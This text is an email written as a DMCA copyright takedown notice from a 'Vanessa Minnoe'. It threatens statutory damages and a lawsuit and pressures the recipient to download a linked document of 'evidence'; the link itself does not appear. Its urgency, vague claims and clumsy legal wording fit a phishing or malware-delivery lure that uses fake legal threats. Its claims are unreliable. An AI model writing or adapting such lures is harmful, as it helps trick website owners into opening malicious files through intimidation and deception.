Hi!

My name is Vanessa.

Your website or a website that your organization hosts is violating the copyrighted images owned by me personally.

Check out this doc with the URLs to my images you utilized at    www.<redacted>.com    and my previous publication to find the evidence of my copyrights.

Download it right now and check this out for yourself:

In my opinion you have deliberately infringed my rights under 17 USC Section 101 et seq. and can be liable for statutory damage of up to $130,000 as set-forth in Sec. 504(c)(2) of the Digital millennium copyright act (DMCA) therein.

This message is official notification. I demand the elimination of the infringing materials referenced above. Please be aware as a company, the DMCA requires you, to eliminate and/or disable access to the copyrighted materials upon receipt of this particular notice. In case you do not stop the use of the previously mentioned copyrighted materials a legal action will likely be started against you.

I have a good self-belief that use of the copyrighted materials described above as allegedly violating is not permitted by the legal copyright proprietor, its legal agent, or the law.

I swear, under penalty of perjury, that the information in this letter is accurate and that I am the legal copyright proprietor or am authorized to act on behalf of the proprietor of an exclusive and legal right that is presumably violated.

Sincerely,
Vanessa Minnoe
